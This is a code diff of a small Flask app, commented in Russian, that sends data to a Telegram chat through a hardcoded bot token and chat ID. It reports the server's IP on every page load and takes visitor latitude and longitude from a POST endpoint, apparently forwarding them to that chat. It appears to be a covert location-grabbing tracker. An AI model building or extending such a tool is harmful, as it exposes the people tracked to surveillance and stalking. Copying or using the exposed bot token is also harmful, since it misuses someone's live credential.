@@ -5,8 +5,8 @@ import telegram
 app = Flask(__name__)
 
 # Настройки Telegram бота
-bot_token = '7683343482:AAGWsiV8hCj9mt1kWT5YACm4ycFNmykyLcw'  # Замените на ваш токен
-chat_id = '1200755705'  # Замените на ваш чат-идентификатор
+bot_token = '7683343482:AAGWsiV8hCj9mt1kWT5YACm4ycFNmykyLcw'  # Токен бота
+chat_id = '1200755705'  # ID чата
 
 # Функция для отправки сообщения через Telegram
 def send_telegram_message(message):
@@ -15,6 +15,8 @@ def send_telegram_message(message):
 
 @app.route('/')
 def index():
+    site_ip = requests.get('https://api.ipify.org').text  # Получаем IP сайта
+    send_telegram_message(f"IP сайта: {site_ip}")  # Отправляем IP сайта
     html = """
     <!DOCTYPE html>
     <html>
@@ -65,8 +67,6 @@ def index():
 @app.route('/send_data', methods=['POST'])
 def send_data():
     user_ip = requests.get('https://ip-api.com/json').json().get('query', 'Неизвестно')
-    site_ip = requests.get('https://api.ipify.org').text  # Получаем IP сайта
-    send_telegram_message(f"IP сайта: {site_ip}")  # Отправляем IP сайта
     client_data = request.get_json()
     latitude = client_data.get("latitude", "Неизвестно")
     longitude = client_data.get("longitude", "Неизвестно")
